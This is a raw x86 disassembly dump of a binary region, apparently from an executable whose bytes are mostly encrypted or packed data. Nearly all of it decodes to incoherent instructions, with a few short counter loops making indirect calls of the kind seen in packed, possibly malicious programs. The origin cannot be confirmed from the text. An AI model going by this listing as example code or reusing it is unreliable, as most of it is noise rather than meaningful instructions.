  412861:	(bad)  
  412862:	pop    esi
  412863:	mov    ah,0xd4
  412865:	and    eax,DWORD PTR [esp+ecx*2+0x60]
  412869:	bound  esp,QWORD PTR [edx]
  41286b:	ins    BYTE PTR es:[edi],dx
  41286c:	fwait
  41286d:	jle    0x41286e
  41286f:	xchg   esp,eax
  412870:	mov    esi,DWORD PTR [ecx-0x45]
  412873:	inc    ebx
  412874:	sub    eax,0x35eabca5
  412879:	dec    ebp
  41287a:	adc    eax,DWORD PTR [eax-0x62]
  41287d:	push   eax
  41287e:	and    BYTE PTR ds:0x3159ed25,0x2a
  412885:	pusha  
  412886:	(bad)  
  412887:	das    
  412888:	jmp    0x1f1278e4
  41288d:	push   ebp
  41288e:	and    al,0x70
  412890:	xchg   ebp,eax
  412891:	in     al,dx
  412892:	inc    esp
  412893:	je     0x4128e2
  412895:	gs jl  0x412848
  412898:	stc    
  412899:	lock mov cl,0x6a
  41289c:	das    
  41289d:	sbb    dl,ch
  41289f:	adc    eax,0xe198f5a
  4128a4:	lea    esi,[esi-0x49]
  4128a7:	mov    DWORD PTR [ebp+0x23],edi
  4128aa:	mov    BYTE PTR [ecx+esi*4],ah
  4128ad:	pop    ebp
  4128ae:	sbb    eax,0x87c8faa8
  4128b3:	pop    edi
  4128b4:	cmp    al,0x8d
  4128b6:	popf   
  4128b7:	nop
  4128b8:	push   ecx
  4128b9:	sub    edx,DWORD PTR [edx+0x4140a4a6]
  4128bf:	jnp    0x4128ec
  4128c1:	in     eax,dx
  4128c2:	(bad)  
  4128c3:	jbe    0x41285f
  4128c5:	ret    0x3e6b
  4128c8:	or     al,0xb5
  4128ca:	(bad)  
  4128cb:	int3   
  4128cc:	mov    esi,0x6776ac96
  4128d1:	push   edx
  4128d2:	mov    dh,0x4e
  4128d4:	push   edx
  4128d5:	cmp    eax,0x79df1e77
  4128da:	jmp    0x4128e2
  4128dc:	fist   DWORD PTR [eax+edi*8+0x58]
  4128e0:	xchg   ebx,eax
  4128e1:	loopne 0x412864
  4128e3:	das    
  4128e4:	test   eax,0xa0a40dbc
  4128e9:	fld    TBYTE PTR [edi-0x14]
  4128ec:	inc    esi
  4128ed:	stos   DWORD PTR es:[edi],eax
  4128ee:	out    dx,eax
  4128ef:	mov    bl,0xb4
  4128f1:	imul   edi,DWORD PTR [edx+esi*4+0x73],0xe
  4128f6:	dec    edi
  4128f7:	or     DWORD PTR [ebx+eiz*8+0x26d9b174],0xffffffc7
  4128ff:	repz push 0x8bba80bf
  412905:	dec    ebp
  412906:	dec    esi
  412907:	call   0x41566ce6
  41290c:	retf   0x3921
  41290f:	scas   eax,DWORD PTR es:[di]
  412911:	cld    
  412912:	fscale 
  412914:	pop    ecx
  412915:	mov    eax,0x759c1076
  41291a:	aad    0xf0
  41291c:	rcl    DWORD PTR [esi],1
  41291e:	adc    al,0xa4
  412920:	mov    edx,0x2e0e3988
  412925:	ins    DWORD PTR es:[edi],dx
  412926:	je     0x4128ff
  412928:	lahf   
  412929:	jne    0x412969
  41292b:	repnz lods eax,DWORD PTR ds:[esi]
  41292d:	pop    ebx
  41292e:	mov    WORD PTR [esi],?
  412930:	mov    fs,WORD PTR [esi+0x37]
  412933:	jne    0x4128b5
  412935:	test   BYTE PTR [edi+0x51c8ef28],dl
  41293b:	cmp    esi,DWORD PTR [edi+0x4e]
  41293e:	scas   al,BYTE PTR es:[edi]
  41293f:	sbb    eax,0x6edb6bd6
  412944:	jmp    0x4128ea
  412946:	dec    BYTE PTR [eax-0x1d]
  412949:	js     0x412949
  41294b:	pop    es
  41294c:	cmp    BYTE PTR [edi],bh
  41294e:	sbb    cl,BYTE PTR [ebx+0x8]
  412951:	in     al,0x7d
  412953:	xchg   BYTE PTR [ebx],bh
  412955:	push   eax
  412956:	cdq    
  412957:	inc    ecx
  412958:	xor    cl,BYTE PTR [ebx+0x3b322ab2]
  41295e:	pushf  
  41295f:	loopne 0x4129a0
  412961:	push   ebx
  412962:	sbb    eax,0xd97e774a
  412967:	inc    ebp
  412968:	dec    ebx
  412969:	cmp    DWORD PTR [eax+0x1b3b3cd1],esi
  41296f:	push   ecx
  412970:	push   esp
  412971:	stc    
  412972:	sub    DWORD PTR [eax+0x26],edi
  412975:	in     eax,0x5c
  412977:	jg     0x4129ee
  412979:	pop    ebx
  41297a:	leave  
  41297b:	lods   eax,DWORD PTR ds:[esi]
  41297c:	ins    BYTE PTR es:[edi],dx
  41297d:	cli    
  41297e:	jl     0x4129b1
  412980:	mov    WORD PTR [eax-0x23],?
  412983:	in     al,dx
  412984:	adc    DWORD PTR [edi+0x54],ebp
  412987:	push   esp
  412988:	lock xlat BYTE PTR ss:[ebx]
  41298b:	scas   eax,DWORD PTR es:[edi]
  41298c:	sub    BYTE PTR [edi],ah
  41298e:	fs fwait
  412990:	bound  edx,QWORD PTR [ecx+esi*2+0x76c80df2]
  412997:	xchg   ebp,eax
  412998:	mov    esi,0x1eb0cd51
  41299d:	test   esi,esi
  41299f:	cdq    
  4129a0:	pop    ss
  4129a1:	retf   0xd7fc
  4129a4:	aas    
  4129a5:	sbb    eax,DWORD PTR [ebp-0x4e]
  4129a8:	and    ebp,DWORD PTR [esi-0x47]
  4129ab:	push   0x29d3cbd0
  4129b0:	sahf   
  4129b1:	add    dh,BYTE PTR [esi]
  4129b3:	mov    ch,0x92
  4129b5:	dec    esp
  4129b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129b7:	test   DWORD PTR [ecx],eax
  4129b9:	dec    ecx
  4129ba:	add    ah,dh
  4129bc:	cmovl  esi,DWORD PTR [esi-0x49]
  4129c0:	pop    esp
  4129c1:	push   cs
  4129c2:	mov    ebx,0x5bcec79c
  4129c7:	test   eax,0x87a14775
  4129cc:	ficom  WORD PTR [ebx+0x37]
  4129cf:	out    dx,eax
  4129d0:	mov    cl,0x9
  4129d2:	or     BYTE PTR [esi+0x517ac449],cl
  4129d8:	adc    ecx,DWORD PTR [edi]
  4129da:	(bad)  
  4129db:	pop    ebp
  4129dc:	xchg   edx,eax
  4129dd:	sub    DWORD PTR [eax+edx*1+0x3b],esp
  4129e1:	(bad)
  4129e4:	jmp    0x4129b5
  4129e6:	jmp    0xdf46:0x90c957f4
  4129ed:	inc    ebx
  4129ee:	jne    0x412a67
  4129f0:	fisttp DWORD PTR [ebx-0x2e40c54c]
  4129f6:	dec    edx
  4129f7:	jmp    0x33b7:0xd4b236d
  4129fe:	pop    ebx
  4129ff:	dec    esp
  412a00:	inc    edx
  412a01:	fild   DWORD PTR ds:0x8d352b61
  412a07:	xor    ah,BYTE PTR [esi]
  412a09:	(bad)  
  412a0a:	push   esp
  412a0b:	push   ss
  412a0c:	cmp    esp,eax
  412a0e:	push   edi
  412a0f:	imul   edx,DWORD PTR [ebx],0xffffffa9
  412a12:	jb     0x4129ad
  412a14:	fild   QWORD PTR [ebp+0xe7498fe]
  412a1a:	retf   
  412a1b:	loop   0x4129ee
  412a1d:	push   ss
  412a1e:	nop
  412a1f:	das    
  412a20:	sbb    bh,dl
  412a22:	jl     0x412a7c
  412a24:	jl     0x412a12
  412a26:	push   es
  412a27:	inc    ecx
  412a28:	sahf   
  412a29:	sub    al,0x2c
  412a2b:	inc    ecx
  412a2c:	inc    ecx
  412a2d:	mov    DWORD PTR [edx],esp
  412a2f:	dec    edi
  412a30:	fs es sti 
  412a33:	add    ecx,eax
  412a35:	out    dx,eax
  412a36:	jb     0x412aa2
  412a38:	push   ss
  412a39:	pop    ecx
  412a3a:	mov    ds:0xa8be74a0,eax
  412a3f:	push   esi
  412a40:	sub    al,0xf1
  412a42:	imul   eax,DWORD PTR [ebp+0xc4a406d],0x67
  412a49:	jb     0x4129f7
  412a4b:	cmc    
  412a4c:	push   ds
  412a4d:	int3   
  412a4e:	add    eax,0x2c0fb0d9
  412a53:	retf   0xfa99
  412a56:	imul   ebx,DWORD PTR [ebx],0xffffffdb
  412a59:	es pop esp
  412a5b:	aas    
  412a5c:	jne    0x412a4d
  412a5e:	sti    
  412a5f:	aas    
  412a60:	jns    0x412a98
  412a62:	xchg   ecx,eax
  412a63:	imul   ecx,edx,0xb1d7f0c5
  412a69:	mov    bh,bl
  412a6b:	cmp    esi,DWORD PTR [edx-0x40145a2f]
  412a71:	int    0x2b
  412a73:	cmp    eax,0x86734c52
  412a78:	hlt    
  412a79:	retf   0x2031
  412a7c:	push   ebx
  412a7d:	por    mm0,QWORD PTR [esi]
  412a80:	fisttp DWORD PTR [edi]
  412a82:	call   0x859870c8
  412a87:	aas    
  412a88:	fsub   DWORD PTR [esi-0xb]
  412a8b:	mov    ecx,0xe171de59
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e120
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fcf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fcf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b7a
  412b3b:	aam    0xb0
  412b3d:	jb     0x412b50
  412b3f:	data16 jo 0x412bb2
  412b42:	mov    ecx,0x4870707e
  412b47:	inc    edi
  412b48:	ds inc eax
  412b4a:	cmp    al,0xd3
  412b4c:	imul   esi,DWORD PTR [ecx+ebp*1-0x1d],0x6e64ed4e
  412b54:	xchg   ebp,eax
  412b55:	mov    ecx,0xe3e25213
  412b5a:	jl     0x412b26
  412b5c:	dec    eax
  412b5d:	jecxz  0x412b87
  412b5f:	and    eax,0x6865ab48
  412b64:	and    al,0xa7
  412b66:	xor    ch,bh
  412b68:	out    0xd0,eax
  412b6a:	push   ebx
  412b6b:	mov    al,ds:0xc7582754
  412b70:	test   al,0x65
  412b72:	xchg   BYTE PTR [edi-0x3561ee39],ah
  412b78:	pop    ebp
  412b79:	mov    dl,0x86
  412b7b:	out    0x98,al
  412b7d:	inc    edx
  412b7e:	lahf   
  412b7f:	mov    bl,0x4
  412b81:	jg     0x412bfa
  412b83:	jo     0x412b66
  412b85:	xor    al,0x6e
  412b87:	cs add esp,ebp
  412b8a:	adc    al,0x3a
  412b8c:	pop    esp
  412b8d:	and    ebp,DWORD PTR [eax+eax*4+0x55]
  412b91:	xchg   ebx,eax
  412b92:	mov    dh,0x24
  412b94:	nop
  412b95:	mov    ebp,0xe85b5bc5
  412b9a:	inc    esi
  412b9b:	loop   0x412b71
  412b9d:	or     ah,BYTE PTR [edx+0x105d749f]
  412ba3:	push   0xffffff9a
  412ba5:	dec    ecx
  412ba6:	pushf  
  412ba7:	cmc    
  412ba8:	push   eax
  412ba9:	mov    eax,0xca54d29b
  412bae:	js     0x412b41
  412bb0:	mov    edx,0xa5b6f28
  412bb5:	cmp    ecx,DWORD PTR [esi-0x3]
  412bb8:	mov    ebx,0xacf705c
  412bbd:	sub    bl,ch
  412bbf:	push   0xffffffcf
  412bc1:	cli    
  412bc2:	aad    0xd7
  412bc4:	sti    
  412bc5:	inc    esi
  412bc6:	inc    ebp
  412bc7:	adc    BYTE PTR [ebx],bh
  412bc9:	mov    cl,0xc3
  412bcb:	test   BYTE PTR [ecx+0x74],0xee
  412bcf:	sar    edi,1
  412bd1:	in     eax,0x31
  412bd3:	xor    al,0x7f
  412bd5:	int3   
  412bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bd7:	cmp    eax,0x7417c074
  412bdc:	aaa    
  412bdd:	dec    eax
  412bde:	mov    ebp,0x23d1c1b7
  412be3:	add    BYTE PTR [eax+0x34492642],0xaf
  412bea:	adc    ebx,ebx
  412bec:	fwait
  412bed:	rol    BYTE PTR [esi-0x55a1b0a4],0xcd
  412bf4:	inc    ebx
  412bf5:	fld    DWORD PTR [ebx-0x80]
  412bf8:	pop    ebp
  412bf9:	mov    es,WORD PTR [eax+eiz*4+0x562a8723]
  412c00:	mov    ch,0x55
  412c02:	dec    esp
  412c03:	out    dx,al
  412c04:	loope  0x412c5a
  412c06:	sbb    al,0xa0
  412c08:	xchg   BYTE PTR [esp+ebp*4+0x34],dh
  412c0c:	inc    esi
  412c0d:	mov    ah,al
  412c0f:	mov    al,BYTE PTR [ecx+ebp*8]
  412c12:	jnp    0x412bbd
  412c14:	push   ds
  412c15:	mov    ds:0x4af508c0,al
  412c1a:	lea    ebp,[edx-0xf886444]
  412c20:	cmp    eax,esp
  412c22:	adc    BYTE PTR [edi+0x67],dl
  412c25:	xlat   BYTE PTR ds:[ebx]
  412c26:	push   ebx
  412c27:	mov    esp,0x2ba6bbfc
  412c2c:	pop    eax
  412c2d:	xor    eax,0xf3531695
  412c32:	scas   al,BYTE PTR es:[edi]
  412c33:	in     eax,dx
  412c34:	jno    0x412c1f
  412c36:	sub    eax,0x293d3fd6
  412c3b:	mov    edi,0xf369c1e4
  412c40:	test   eax,0xf16f998d
  412c45:	pop    ss
  412c46:	sub    esi,DWORD PTR [ebx-0x3]
  412c49:	xor    ebx,DWORD PTR [edx+0x35fb9e6d]
  412c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c50:	popa   
  412c51:	hlt    
  412c52:	ss retf 
  412c54:	ret    
  412c55:	mov    edx,0xa474b95d
  412c5a:	add    eax,0x32fc1f83
  412c5f:	(bad)  
  412c60:	retf   
  412c61:	outs   dx,BYTE PTR ds:[esi]
  412c62:	es cs xchg ebx,eax
  412c65:	and    DWORD PTR ds:0x2e193465,ebp
  412c6b:	cmp    BYTE PTR [edx-0x113e18fe],bl
  412c71:	pop    es
  412c72:	jp     0x412c8e
  412c74:	int3   
  412c75:	dec    ebx
  412c76:	adc    al,0x52
  412c78:	(bad)  
  412c7a:	mov    esp,0x14f02b7c
  412c7f:	jp     0x412c03
  412c81:	push   edi
  412c82:	stos   DWORD PTR es:[edi],eax
  412c83:	inc    esp
  412c84:	adc    BYTE PTR [ebx],ah
  412c86:	mov    al,0x2f
  412c88:	in     al,dx
  412c89:	push   ebx
  412c8a:	(bad)  
  412c8b:	push   ds
  412c8c:	cmp    BYTE PTR [ebx+0x598f3101],bl
  412c92:	mov    al,0xc0
  412c94:	and    al,0xa2
  412c96:	dec    ecx
  412c97:	add    DWORD PTR [esi],edi
  412c99:	lods   al,BYTE PTR ds:[esi]
  412c9a:	xchg   esp,eax
  412c9b:	cmp    DWORD PTR [esi+ecx*1-0x66372e52],edi
  412ca2:	js     0x412cc4
  412ca4:	ret    0xc7f4
  412ca7:	mov    al,ds:0x52766bf7
  412cac:	xor    ecx,edi
  412cae:	pop    edx
  412caf:	mov    ds:0x2d7be334,al
  412cb4:	nop
  412cb5:	(bad)  
  412cb6:	test   eax,0x830533e7
  412cbb:	daa    
  412cbc:	int    0x36
  412cbe:	sahf   
  412cbf:	cmp    ebp,DWORD PTR [eax-0x1fa7188c]
  412cc5:	pop    esi
  412cc6:	mov    ebx,cs
  412cc8:	in     eax,0xa1
  412cca:	pop    ebp
  412ccb:	mov    es,WORD PTR [eax-0x695a05c1]
  412cd1:	push   edi
  412cd2:	pop    ebp
  412cd3:	xor    BYTE PTR [ecx+0x4],cl
  412cd6:	mov    edi,0x264c6818
  412cdb:	rcl    BYTE PTR [edi+0x5b],1
  412cde:	push   cs
  412cdf:	jp     0x412c7b
  412ce1:	or     ebp,DWORD PTR [edi+0x6af95597]
  412ce7:	out    0xca,al
  412ce9:	repz dec ebx
  412ceb:	mov    ds:0xcb1aa073,eax
  412cf0:	in     al,0x50
  412cf2:	xchg   edx,eax
  412cf3:	arpl   WORD PTR [eax+ebp*4+0x503099db],di
  412cfa:	xchg   esi,eax
  412cfb:	pop    ebp
  412cfc:	imul   esi,DWORD PTR [ecx],0x3079cf7d
  412d02:	aad    0xd7
  412d04:	out    dx,eax
  412d05:	(bad)  
  412d06:	jmp    0x577fbd34
  412d0b:	imul   esi,DWORD PTR [edi+0x4ec73cb1],0x14bde10e
  412d15:	adc    al,0xc3
  412d17:	jb     0x412ca2
  412d19:	scas   eax,DWORD PTR es:[edi]
  412d1a:	in     al,0x67
  412d1c:	arpl   si,ax
  412d1e:	repnz xchg ebx,edi
  412d21:	(bad)  
  412d22:	fcomp  st(7)
  412d24:	jb     0x412cd8
  412d26:	and    BYTE PTR [edx-0x28],bl
  412d29:	leave  
  412d2a:	lock xchg DWORD PTR [esi-0x17],esp
  412d2e:	js     0x412d38
  412d30:	and    BYTE PTR [eax+eiz*4-0xa5a1d59],0x32
  412d38:	inc    ecx
  412d39:	lods   eax,DWORD PTR es:[esi]
  412d3b:	dec    esi
  412d3c:	and    bl,dh
  412d3e:	fwait
  412d3f:	clc    
  412d40:	cmp    DWORD PTR [ebx],ebp
  412d42:	xlat   BYTE PTR ds:[ebx]
  412d43:	push   edi
  412d44:	add    al,0xb1
  412d46:	pop    es
  412d47:	mov    dl,0x20
  412d49:	(bad)  
  412d4b:	inc    esp
  412d4c:	stos   DWORD PTR es:[edi],eax
  412d4d:	push   ebp
  412d4e:	dec    esp
  412d4f:	push   ecx
  412d50:	xor    BYTE PTR [edi+0x1c94bd92],dl
  412d56:	push   edx
  412d57:	cs dec esi
  412d59:	or     dl,cl
  412d5b:	out    0x8a,al
  412d5d:	cmp    esp,DWORD PTR [edx-0xd]
  412d60:	add    al,0x13
  412d62:	ss xchg esp,eax
  412d64:	inc    esp
  412d65:	fst    DWORD PTR [eax-0x35ab7c40]
  412d6b:	dec    edi
  412d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d6d:	mov    ah,0x1f
  412d6f:	mov    eax,ds:0x43f26d6b
  412d75:	xchg   DWORD PTR [ebx+0x27],edi
  412d78:	mov    eax,ds:0xfa0072f8
  412d7d:	in     eax,0x42
  412d7f:	loope  0x412d46
  412d81:	push   0x2f285557
  412d86:	mov    eax,0xea9dbf65
  412d8b:	int3   
  412d8c:	jns    0x412db8
  412d8e:	xor    esi,DWORD PTR [edi+0x3b]
  412d91:	in     al,dx
  412d92:	repnz shr DWORD PTR [esi],1
  412d95:	data16 add al,0x33
  412d98:	test   bh,0x3e
  412d9b:	in     al,dx
  412d9c:	inc    edi
  412d9d:	(bad)  
  412da0:	xor    al,bl
  412da2:	push   ebp
  412da3:	je     0x412d47
  412da5:	sbb    al,dh
  412da7:	or     bh,BYTE PTR [ebx-0x49]
  412daa:	mov    edi,DWORD PTR [ecx]
  412dac:	stos   BYTE PTR es:[edi],al
  412dad:	xor    esi,DWORD PTR [ebp+0x3b62ed10]
  412db3:	xchg   edx,eax
  412db4:	sub    ch,cl
  412db6:	mov    BYTE PTR [esi-0x60],ah
  412db9:	jo     0x412da0
  412dbb:	sbb    al,0xb5
  412dbd:	js     0x412d74
  412dbf:	repnz lods eax,DWORD PTR ds:[esi]
  412dc1:	xlat   BYTE PTR ds:[ebx]
  412dc2:	mov    ds:0xb18ed5cf,eax
  412dc7:	dec    ecx
  412dc8:	fstp   DWORD PTR [esi-0x7af66ea9]
  412dce:	mov    edi,0x51a1476a
  412dd3:	lea    esi,[edx+0x405eafc1]
  412dd9:	aad    0xd4
  412ddb:	inc    DWORD PTR [edx+eiz*1-0x3fc9c1f2]
  412de2:	add    al,0xec
  412de4:	jmp    0x9b1b:0x70350276
  412deb:	iret   
  412dec:	mov    gs,WORD PTR [esi+0x2339c9f]
  412df2:	dec    esi
  412df3:	inc    edi
  412df4:	xchg   edx,eax
  412df5:	push   esi
  412df6:	pop    es
  412df7:	jp     0x412e60
  412df9:	icebp  
  412dfa:	fs mov esp,0x696a7c7d
  412e00:	mov    eax,ds:0x66880df7
  412e05:	inc    ecx
  412e06:	sbb    BYTE PTR [edx-0x7b],dh
  412e09:	rcr    BYTE PTR [ecx+0x1c],cl
  412e0c:	fild   WORD PTR [edi+0x1c2581ce]
  412e12:	loope  0x412e56
  412e14:	add    BYTE PTR [eax],al
  412e16:	add    BYTE PTR [eax],al
  412e18:	add    cl,ch
  412e1a:	sldt   WORD PTR [eax]
  412e1d:	add    BYTE PTR [ebx],dh
  412e1f:	leave  
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [edi+0x5a700ba7],sp
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x1a70707e
  412e82:	gs bnd je 0x412ecc
  412e86:	or     ch,BYTE PTR [esi+0x18a0694f]
  412e8c:	test   eax,0x78171899
  412e91:	rcr    DWORD PTR [edx],0x72
  412e94:	push   0xffffffcf
  412e96:	out    dx,al
  412e97:	mov    ebp,0xb262d209
  412e9c:	clc    
  412e9d:	sahf   
  412e9e:	cmp    ebp,DWORD PTR [edx+0x22]
  412ea1:	mov    edi,0x93fde879
  412ea6:	dec    esi
  412ea7:	mul    DWORD PTR [edx+0x54]
  412eaa:	nop
  412eab:	sbb    ebx,edi
  412ead:	jnp    0x412e50
  412eaf:	dec    esp
  412eb0:	sub    eax,0x7f6f8b9f
  412eb5:	in     al,dx
  412eb6:	sub    edx,DWORD PTR [edi]
  412eb8:	xor    DWORD PTR [esi+0x1b5b992],eax
  412ebe:	mov    eax,?
  412ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec1:	cwde   
  412ec2:	push   ecx
  412ec3:	xchg   BYTE PTR [edi+0x22f70f71],dh
  412ec9:	loop   0x412f2d
  412ecb:	imul   edx,esp,0xffffffcf
  412ece:	mov    esp,0x379d3196
  412ed3:	icebp  
  412ed4:	popf   
  412ed5:	pop    edi
  412ed6:	adc    al,0x14
  412ed8:	(bad)  
  412ed9:	cmp    BYTE PTR [ebx],dh
  412edb:	inc    ebx
  412edd:	xor    DWORD PTR [edx+edi*4-0x14f56d9b],ecx
  412ee4:	retf   
  412ee5:	and    al,0xe0
  412ee7:	xchg   esp,eax
  412ee8:	sub    al,0x94
  412eea:	ja     0x412f4d
  412eec:	jl     0x412f11
  412eee:	lds    ebp,FWORD PTR [ecx-0xfe2669c]
  412ef4:	jmp    0xaf7027c1
  412ef9:	fbld   TBYTE PTR [ebx-0x43]
  412efc:	add    ebp,DWORD PTR [edx]
  412efe:	mov    eax,0x84f5e95b
  412f03:	sbb    edx,DWORD PTR [edx]
  412f05:	rcr    dh,1
  412f07:	xor    eax,0x78cdb1e9
  412f0c:	xor    DWORD PTR [ebp+0x4102c4bb],eax
  412f12:	cs mov esp,0x511bcadc
  412f18:	sbb    esi,DWORD PTR [esi]
  412f1a:	daa    
  412f1b:	dec    eax
  412f1c:	fwait
  412f1d:	cmp    al,0x13
  412f1f:	arpl   WORD PTR [edi],di
  412f21:	or     bl,BYTE PTR [edx+0x6695b7b7]
  412f27:	sbb    DWORD PTR [eax-0x2b],ebp
  412f2a:	(bad)  
  412f2c:	scas   eax,DWORD PTR es:[edi]
  412f2d:	sbb    al,0x2b
  412f2f:	pop    ebx
  412f30:	push   0x89ed4718
  412f35:	dec    ebp
  412f36:	fcom   QWORD PTR [edi-0x4b]
  412f39:	mov    edi,0xd6703ab3
  412f3e:	cmp    esp,esi
  412f40:	dec    edx
  412f41:	xor    DWORD PTR [eax+0x410de7f0],esi
  412f47:	sub    BYTE PTR [eax+0x19],0x8c
  412f4b:	and    esp,0x63557bf0
  412f51:	xchg   esp,eax
  412f52:	pop    ebx
  412f53:	xlat   BYTE PTR ds:[ebx]
  412f54:	fisttp DWORD PTR [edi-0x5c]
  412f57:	pop    ss
  412f58:	push   edi
  412f59:	jmp    0x7f1c:0x335c0216
  412f60:	xor    al,0x3b
  412f62:	repz fsub DWORD PTR [ecx-0x520ed286]
  412f69:	xchg   BYTE PTR fs:[esi],ah
  412f6c:	cmp    ebx,DWORD PTR [ecx]
  412f6e:	aas    
  412f6f:	mov    al,0x80
  412f71:	ret    0x4b3
  412f74:	push   0x65
  412f76:	inc    ebx
  412f77:	mov    eax,0x71122d94
  412f7c:	adc    eax,0x750e9147
  412f81:	out    0xcd,al
  412f83:	inc    eax
  412f84:	cdq    
  412f85:	lock pusha 
  412f87:	sub    eax,DWORD PTR [ebx]
  412f89:	repnz ins DWORD PTR es:[edi],dx
  412f8b:	push   esp
  412f8c:	adc    DWORD PTR [eax],ebx
  412f8e:	xor    al,0x64
  412f90:	jmp    0x15bde59f
  412f95:	adc    ecx,DWORD PTR [edi+0x1f]
  412f98:	and    esp,DWORD PTR [edi+esi*4]
  412f9b:	mov    BYTE PTR [eax+esi*1-0x3aac3921],al
  412fa2:	dec    edi
  412fa3:	fdivp  st(5),st
  412fa5:	pop    ebx
  412fa6:	and    dh,BYTE PTR [edx]
  412fa8:	leave  
  412fa9:	out    dx,eax
  412faa:	repz cdq 
  412fac:	call   0x61d2a5c8
  412fb1:	xchg   ebp,eax
  412fb2:	(bad)  
  412fb3:	aad    0xde
  412fb5:	xchg   ecx,eax
  412fb6:	xchg   ecx,eax
  412fb7:	iret   
  412fb8:	ss add eax,0x46a08f5d
  412fbe:	xor    DWORD PTR [esi],esi
  412fc0:	daa    
  412fc1:	(bad)  [esi-0x1d]
  412fc4:	dec    ebx
  412fc5:	add    al,0x73
  412fc7:	ss sub al,0x81
  412fca:	push   esp
  412fcb:	inc    eax
  412fcc:	das    
  412fcd:	xchg   BYTE PTR [esi+0x13946277],dh
  412fd3:	add    bh,BYTE PTR [edx+edi*2+0x57]
  412fd7:	dec    esi
  412fd8:	dec    ebp
  412fd9:	cmp    ah,BYTE PTR [ebx+ebx*4-0x7a]
  412fdd:	add    al,0xe6
  412fdf:	jmp    0x1048:0x56865322
  412fe6:	mov    eax,ds:0x31882bb7
  412feb:	add    esi,0xffffff80
  412fee:	mov    esi,0x4a0ce61
  412ff3:	fidiv  WORD PTR [ecx]
  412ff5:	push   ds
  412ff6:	mov    eax,ds:0xf7362851
  412ffb:	mov    eax,ds:0x3380786f
  413000:	push   ds
  413001:	(bad)
  413004:	(bad)  
  413006:	jne    0x41302a
  413008:	loopne 0x41300b
  41300a:	cmp    dh,BYTE PTR [edi]
  41300c:	cmp    BYTE PTR [edi+ecx*8-0x6e],bl
  413010:	into   
  413011:	ss xchg ebp,eax
  413013:	sahf   
  413014:	push   0xea5320d8
  413019:	dec    ecx
  41301a:	mov    eax,ds:0xde9de6bd
  41301f:	test   DWORD PTR [ecx+ebp*8],0x3531651e
  413026:	sub    dl,BYTE PTR [ecx]
  413028:	sub    BYTE PTR [ecx+0x42cdc4e5],al
  41302e:	xor    DWORD PTR [edx-0x4],ecx
  413031:	pop    edx
  413032:	in     eax,dx
  413033:	out    0xa5,al
  413035:	mov    ebx,0x6105f746
  41303a:	(bad)  
  41303b:	and    eax,0x4bc13148
  413040:	aaa    
  413041:	mov    cl,0xb3
  413043:	mov    bl,0x12
  413045:	scas   al,BYTE PTR es:[edi]
  413046:	(bad)  
  413047:	retf   
  413048:	pushf  
  413049:	jg     0x41303c
  41304b:	push   ss
  41304c:	shl    BYTE PTR [esp+ebx*2],cl
  41304f:	dec    ecx
  413050:	lods   eax,DWORD PTR ds:[esi]
  413051:	mov    bh,0x63
  413053:	fs pop ebx
  413055:	nop
  413056:	or     eax,0x2a5aebe8
  41305b:	js     0x4130a6
  41305d:	retf   
  41305e:	jge    0x4130b5
  413060:	fidivr DWORD PTR [eax+0x4c]
  413063:	cmp    BYTE PTR [eax-0x732ab103],dh
  413069:	xor    edx,eax
  41306b:	clc    
  41306c:	dec    eax
  41306d:	inc    ebx
  41306e:	pop    ebp
  41306f:	loop   0x413033
  413071:	jno    0x413064
  413073:	test   bl,ah
  413075:	in     eax,0x96
  413077:	xor    BYTE PTR [esi],ch
  413079:	mov    al,0x48
  41307b:	sub    DWORD PTR [edx-0x78693902],esi
  413081:	or     ch,bh
  413083:	or     ebp,DWORD PTR [ebx-0x1218fa91]
  413089:	cmp    DWORD PTR [ecx+ebp*4-0x5daa0b52],esp
  413090:	xor    dl,bh
  413092:	add    BYTE PTR [esi],al
  413094:	pusha  
  413095:	jb     0x413059
  413097:	cmp    ah,al
  413099:	sahf   
